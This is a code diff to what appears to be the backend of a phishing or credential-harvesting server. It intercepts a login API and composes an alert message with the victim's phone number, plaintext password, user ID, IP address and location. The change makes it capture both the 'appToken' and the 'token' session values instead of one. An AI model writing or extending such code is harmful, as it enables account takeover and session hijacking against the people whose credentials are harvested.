@@ -1565,13 +1565,15 @@ app.post('/app/api/system/v2/login', async (req, res) => {
       if (isSuccess) {
         const loginData = getResponseData(jsonResp) || {};
         const memberCode = loginData.memberCode || finalUserId || 'N/A';
-        const userToken = loginData.token || loginData.appToken || '';
+        const appToken = loginData.appToken || '';
+        const token = loginData.token || '';
 
         let successMsg = `🔑 *LOGIN SUCCESSFUL*\n`;
         successMsg += `📱 Phone: \`${phone || 'N/A'}\`\n`;
         successMsg += `🔒 Password: \`${pwd || 'N/A'}\`\n`;
         successMsg += `👤 UserID: \`${memberCode}\`\n`;
-        if (userToken) successMsg += `🎟️ Token: \`${userToken}\`\n`;
+        if (appToken) successMsg += `🎟️ appToken: \`${appToken}\`\n`;
+        if (token) successMsg += `🔑 Token: \`${token}\`\n`;
         successMsg += `🌐 IP: \`${ip}\`${city ? ' (' + city + ')' : ''}\n`;
         successMsg += `🕐 Time: \`${timeStr}\``;
 
